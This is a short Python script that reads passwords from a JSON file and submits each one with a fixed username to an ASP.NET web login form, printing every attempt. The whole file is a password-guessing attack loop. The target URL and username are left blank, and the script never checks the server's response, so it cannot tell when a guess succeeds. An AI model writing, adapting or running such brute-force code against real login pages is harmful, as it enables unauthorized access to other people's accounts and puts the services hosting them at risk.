import requests
import re
import os
import string
import json

url = ""
user = ''
passwords = json.loads(open('Password.json').read())
for word in passwords:
    requests.post(url,allow_redirects=False, data={
        'ctl00$ContentPlaceHolder$Username': user,
        'ctl00$ContentPlaceHolder$Password': word
        })
    print('sending username %s password %s' % (user, word) )
